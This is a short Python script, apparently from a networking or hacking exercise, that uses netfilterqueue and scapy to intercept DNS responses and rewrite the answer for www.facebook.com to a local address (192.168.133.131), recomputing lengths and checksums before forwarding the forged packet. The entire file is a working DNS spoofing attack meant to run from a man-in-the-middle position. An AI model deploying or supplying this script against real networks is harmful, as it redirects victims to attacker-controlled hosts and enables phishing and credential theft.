import netfilterqueue
import scapy.all as s

def run_packet(packet):
    scapypacket=s.IP(packet.get_payload())
    if scapypacket.haslayer(s.DNSRR):
        qname=scapypacket[s.DNSQR].qname
        if "www.facebook.com" in str(qname):
            print("[+] spoofing target")
            answer=s.DNSRR(rrname=qname,ttl=scapypacket[s.DNSRR].ttl,rdata="192.168.133.131")
            scapypacket[s.DNS].an=answer
            scapypacket[s.DNS].ancount=1
            # print(scapypacket.show())

            del scapypacket[s.IP].len
            del scapypacket[s.IP].chksum
            del scapypacket[s.UDP].len
            del scapypacket[s.UDP].chksum
            
            packet.set_payload(bytes(scapypacket))
        #print(scapypacket.show())

    packet.accept()

queue=netfilterqueue.NetfilterQueue() #netfileterqueue object stored in variable
queue.bind(0,run_packet) #binding the queue created from iptables to our netfilterqueue object and calling the run_packet function
queue.run() #running the object



